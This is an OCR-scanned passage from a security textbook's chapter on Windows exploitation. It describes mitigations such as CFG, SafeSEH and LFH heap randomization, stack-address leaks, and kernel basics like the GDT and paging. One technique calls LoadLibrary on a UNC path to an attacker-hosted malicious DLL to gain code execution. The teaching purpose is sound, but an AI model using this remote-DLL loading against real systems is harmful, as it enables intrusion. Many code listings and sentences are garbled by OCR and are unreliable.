The CFG (Control Flow Guard) is a relatively new protection mechanism supported
by Windows. The result of a protected indirect call is shown in Fig. 6.19. Each 
_guard_dispatch_icall_fptr function. In case the function pointer is modified to an
illegal address, he program will be abnormally terminated.
---
## Page 514
6.8 PWN for Windous
501
0088140081aE0：int
coecl nain(int argc, char
0000140081AE0
nain
aeau oo.ad
rgu)
：00E XREF:5_naintj
00001400018E0
00001400818E0
0000140001E0
3000140001AE0
var_18
quordptr
ars_.o
duord ptr
18h
0000140001AE0
arg_s
quord ptr
10h
nov
[rsp*arg_8]. rdx
00081400818E9
sub
rsp,38h
[rsp*arg_o].ecx
000014001AED
nou
[rsp*2ah+var_18],rax
rax,
cs:7fG93P6nXPC8002EA:vo1e (*F)(char
00001400018F4
lea
rcx,a123
rax,[rsp+38h+uar_18]
："123°
0000140001805
8085000410000
cal1
cs1_guard_dispatch_ical_fptr
0000140001800
add
oar
rsp.38h
eax,eax
0000140001811
retn
0000140001811
0000140001811 nain
endp
Fig, 6.19 CFG assembly code
4. SEHOP, SafeSEH
SEH is an exception handling mechanism specific to Windows. In 32-bit Windows,
the SEH information is a singly linked list and stored on the stack. Because this
information contains the address of the SEH Handler, overwriting the SEH became a
common exploit to attack early Windows and its programs, so Microsoft introduced
two mitigating measures in the new version of Windows: SEHOP and SafeSEH.
SEHOP detects if the end of the SEH singly linked list points to a fixed SHE
Handler, or it terminates the program abnormally. SafeSEH detects whether the
SEH Handler currently in use points to a valid address of the current module,
otherwise, it terminates the program abnormally.
5. Heap Randomization
Windows has a number of heap protection mechanisms, the most impressive of
which is LFH randomization. For example. 
#include 
#include ccstdlib>
#include 
#define HALLOC (x) (HeapA1loc (GetProcessHeap [) , HEAP_ZERO_HEMORY,
(×) ) )
int main ()
for [int i = 0; i heap . exe
Al1oc: 000002C58431F0A0
A11oc: 000002C58431E810
A11oc: 000002C58431F0E0
A11oc: 000002C58431F120
A11oc :
000002C58431EE20
A11oc: 000002C58431F2E0
A11oc: 000002C58431F1E0
A11oc: 000002C58431EF20
A11oc: 000002C58431EF60
A11oc: 000002C58431EBA0
Alloe: 000002C58431F1A0
Al1oc: 000002C58431F160
Al1oc: 000002C58431EFA0
A11oc: 000002C58431EC20
Al1oc: 000002C58431F260
Al1oc: 000002C58431F220
A11oc: 000002C58431F2A0
A11oc: 000002C58431ECA0
A11oc: 000002C58431ED20
A11oc: 000002C58431F060
A normal memory allocator will retum consecutive addresses for successive
requests, but as you can see, the allocated addresses are not consecutive, and there
is no pattern to them. With LFH on, the allocation of heap blocks is random, making
it more difficult for attackers to exploit.
6.8.4PWN Techniques forWindows
1. leak on-stack addresses from the heap
Normally, there is no on-stack address on the heap, because the contents of the stack
are generally stored for a shorter period than the contents of the heap. However, there
is a special case under Windows that results in the presence of a stack address in the
contents of the heap. Security researcher jooru found that during the initialization of
the CRT, some of the content containing the address on the stack is copied to the
heap due to the use of uninitialized memory. It is then possible to leak the stack
address from the heap and modify the stack data.
This technique can be used in both x86 and x64 programs.
2. LoadLibrary UNC module.
Since there is no way to execute system function directly on general Windows Pwn
challenges, you need to use a variety of shellcodes to do what you want, but this is
---
## Page 516
6.9 Windows Kemel PWN
503
quite cumbersome, and you may encounter different local and remote environments
when you test the shellcodes. If you can call LoadLibrary, the workload can be
greatly reduced.
LoadLibrary is a Windows function used to load DLLs. Since it supports UNC
Path, you can call LoadLibrary (*crattacker_ip'malicious.dil') to load the DLL
provided by an attacker on a remote server, thus achieving arbitrary code execution
capability. Such an attack is more stable than shellcode execution.
It is worth mentioning that the new version of Windows 10 introduces a Disable
Remote Image Loading mechanism, which makes it impossible to load remote DLLs
using UNC Path if this mitigation measure is enabled when the program runs.
6.9Windows Kernel PWN
To the average programmer, the operating system kermel has always been a myste-
rious place, because most programmers are only responsible for using the various
functions and interfaces provided by the operating system kermel, and often do not
know the details of the operating system kemel's implementation, especially for the
non-open source Windows operating system.
pue sun puads am op Kqm suuond uo Keme mej os s paua wss o J
effort on it? Because the system kermel runs at the highly privileged level of the CPU,
not even System privileges, the theoretical highest privilege of the Windows oper-
ating system, can match it. If we have the privilege to operate at the kermel level, we
can do anything we want in the system. Although operating system kermel vulner-
abilities are more difficult to uncover and more difficult to exploit than application-
level vulnerabilities, they continue to attract security researchers.
This section will lead readers into the Windows kemel and explore its vulnera-
bilities and exploitation techniques, starting from the basics of the Windows kemel
and system architecture, and then gradually understanding kermel exploitation tech-
niques and kermel mitigation measures; at the same time, readers can experience the
technical competition between Microsoft security technicians and hackers, which
will give readers a deeper understanding of attack and defense.
6.9.1About Windows OS
s  n  s o so  o  ppn 
inherited from Windows NT version 4.0. Windows 98/95 is not really a moderm
st 1eq pue uss Suudo soput uapu e jo adaoad osp 0 IN smopu
st AM SOC-SN jo aaeauap e ppisoo oq teo se nq ass Suuado
a truly modern operating system? Let's start with the Intel instruction set architecture
and move on to the organizational structure of the Windows operating system.
---
## Page 517
504
6PWN
6.9.1.180386 and Protected Mode
Throughout the history of Intel processors, the Intel 80386 was the first 32-bit
processor, and the most advanced processors before that were only 16-bit. The
x86 or i386 architecture is now often referred to as the instruction set introduced
by the Intel 80386. From an operating system standpoint, the revolutionary changes
brought about by the Intel 80386 offered different execution models, and it was the
emergence of the privileged model that made the implementation of moderm oper-
ating systems possible.
1. real mode
Real mode is a way to simulate the execution of Intel 8086 processors, which is what
the Intel 8086 uses. the post Intel 80386 processors use real mode to simulate the
execution of older processors, and all newer Intel processors run in real mode at
startup before switching to other execution modes. Only 16-bit registers, such as
AX, BX, SP, BP, etc., can be accessed in real mode, and there is no memory
protection mechanism or real process concept in the whole system, at most 1 MB
of memory can be accessed using the 16bit segment registers and 16bit offset values.
MS-DOS is a typical real-mode operating system, DOS operating system does not
really have the concept of multi-processing, only one process can run at a time. As
the reader will see later, modern Windows operating systems rely on the protection
ou seq SO uoe u ussaood-n ud o ossaood pu o jo apo
concept of memory isolation protection and privilege hierarchy. In other words,
there is no distinction between kemel code and user code, and the code running on
DOS can modify any memory without restriction. This is a limitation of the pro-
cessor’s execution mode, not something that Microsoft does not want, but something
that the processor does not.
2. Protected mode
Protected mode is a new execution mode introduced by Intel 80386 and is the
cormerstone behind the implementation of moderm operating systems. First of all,
in protected mode, Intel designed the concept of permission ring (Ring), and the idea
 ssd x  su   on  s mg  o 
which many privileged instructions can be executed by the system kernel. Ring3 has
minimal privileges and is used by user applications. Ring1 and Ring2 are used by
intermediate privileged codes such as drivers. Although in practice neither Windows
nor UNIX-like system developers follow the Intel design, they end up using only
Ring0 and Ring3, where Ring0 is used to execute the operating system kemel, third-
party drivers, etc., and Ring3 is used to execute the users code. But the idea of
privilege isolation was definitely applied. Some sensitive register operation instruc-
dn ao p uodo aslu oq os eqo aog p se ons so
descriptor table operation, wrmsr for model-specific register (MSR) operation, and
direct IO operation instructions in and out, become privileged instructions that can
only be executed under Ring0. In addition, Intel has hooked the memory to the
---
## Page 518
6.9 Windows Kemel PWN
505
m o ua pue gtua ssaooe ueo sons gg e os Suu asaad
Ring3 instructions can only access Ring3 memory, and accessing Ring0 memory
triggers a General Protect exception. Before we can go any further in understanding
how this protection is implemented, we need to understand how modern operating
systems address memory via protected mode processors.
6.9.1.2Windows OS Addressing
uasou qnon pe s ussppe aouu uss ueodo uapo
tation and memory paging, in which the segmentation mechanism is a legacy of the
real model, while the paging mechanism is newly introduced. Therefore, the actual
segmentation mechanism does not play any role, and the Windows kemel *over-
head" the segmentation mechanism through a way called flat addressing. Flat
addressing means that the items (segment selectors) in the segment table (the global
descriptor table) all point to the same area of memory, so it makes no difference if we
access the CS or DS, or SS segment registers (there are some exceptions, such as FS
or GS which always point to the thread environment block TEB in the user state and
to the processor control area KPCR in the kermel state). Of course, to understand this
process, one needs to be clear about the segment addressing process.
First of all, the OS kermel stores segmentation information through segment 
tables. Since a modern OS running in protected mode is a multi-process parallel
system, each process has its segment table, i.e. Global Descriptor Table (GDT). Intel 
designed the GDTR register to store the GDT base address of the process, and when
the process context switches, the GDTR will also change to always correspond to the
GDT base address of the current process, and the instructions for GDT operation are
privileged instructions that can only be executed under Ring0.
Figure 6.20 is a graphical depiction of the GDT structure in the official Intel
documentation, note that not only GDT but LDT is also included, which is not the
focus of our attention. The virtual address of the target memory address is divided
into two parts, one is stored in segment registers called segment selectors, and the
other is the address we want to access, which is an offset, see Fig. 6.21.
We try to observe this process with Windbg. First, we use Windbg to set up a
ndo-om dn pas o moq uedxo m am) uoisss urnqp yndoo-om
debugging later) and then execute the .process command to view the current process
context, which will returm the EPROCESS address of the current process, and you
can use lprocess command to determine the EPROCESS address to view
the information of processes. In Fig. 6.22 the process is located in a breakpoint in
the NT module of the system process context. The r command is then used to view
the contents of the GDTR and CS registers.
As can be seen in Fig. 6.23, the global descriptor item number 0x10 is a segment
with a base address of O and an upper limit of 0. An upper bound of O means that
there is no upper bound, and thus we get a virtual address of 0xff80149247cd0 and
a linear address of 0xfff80149247cd0. In other words, the virtual address is the
same as the segmented linear address, which confirms the flat addressing patterm
---
## Page 519
506
6PWN
Descriptor
Global
Descriptor
Local
Table (GDT)
Table (LDT)
0 = I1
TI = 1
V
Selector
Segrment
56
48
8
40
32
32
24
24
76
16
First Descriptor in
GDT is Not Used
GDTR Register
LDTR Register
Limit
Base Address
Lmit
Base Aofress
es fos
Fig, 6.20 GDT structure. (From Intel documentation).
Fig, 6.21 Offset code
mov
rcx,rax
lea
r8,[rbp+11F0h+var_B60]
mov
rax, cs:off_14002B068
moV
edx,68h
described above. Although the segmentation mechanism and the global descriptor
table are not very useful on Windows, they still implement Intel’s idea of privilege-
based ring isolation.
Figure 6.24 shows the structure of a global descriptor table entry, where bits
13 and 14 are referred to as DPL and are used to identify a segment's access
permissions.
If such a rule is violated during a memory access, it triggers Exception #O in the
Interrupt Description Table IDT, the generic protection exception, which is a
memory access violation.
After getting the linear address, the next question is how to get the physical
address corresponding to the linear address, which is the real location of memory.
Undoubtedly, this is achieved through the paging mechanism.
---
## Page 520
6.9 Windows Kemel PWN
507
J-process
int
1
Inplicit process is now ffff99eb'3a4ce44
o:kd>Iprocess ffff99ob*3a4c0440 0
PROCESS ffff99eb3a4c0440
DirBase: 001aa002 ObjectTable: ffffds0bf3814040 HandleCount: 2141
SessionId: none
Peb:eeceoeo9
Parentcid：00
Image: Systen
Fig, 6.22 Windbg window
0:kd> r gdtr
gdtr=fffff80323344fbo
0: kd> dg ex10
Se1
Base
Limit
Type
1ze
P Si Gr Pr Lo
an es ng Flags
0010
000000000000000000000000
e00coooo Code RE Ac 0 Nb By P
Lo 0000029b
Fig, 6.23 The global descriptor item number 0x10
Base adress (24-32)
mt(16-19)
Type
Base address (16-23)
Base address(Bi 0-15)
Segment Limit (Bit 0-15)
Fig, 6.24 The structure of a global descriptor table
The paging mechanism is generally implemented through a two-level structure:
Page Directory and Page Table, where the items are called Page Directory Entry
(PDE) and Page Table Entry (PTE), respectively. Similar to the Windows handler
table structure, the paging mechanism saves memory space by using two levels of
sparse tables. The Page Directory Entry holds the base address of the page table,
while the Page Table Entry holds the physical base address of the actual physical
memory page. The linear address we converted carlier is also used as a *selector". So
the question is how to get the base address of the page directory? In fact, similar to
the global descriptor table, the page-directory base address is also stored in a register,
but it is stored in the CR3 register instead of a dedicated register, hence CR3 is also
called the page-directory base register PDBR, see Fig. 6.25.
---
## Page 521
508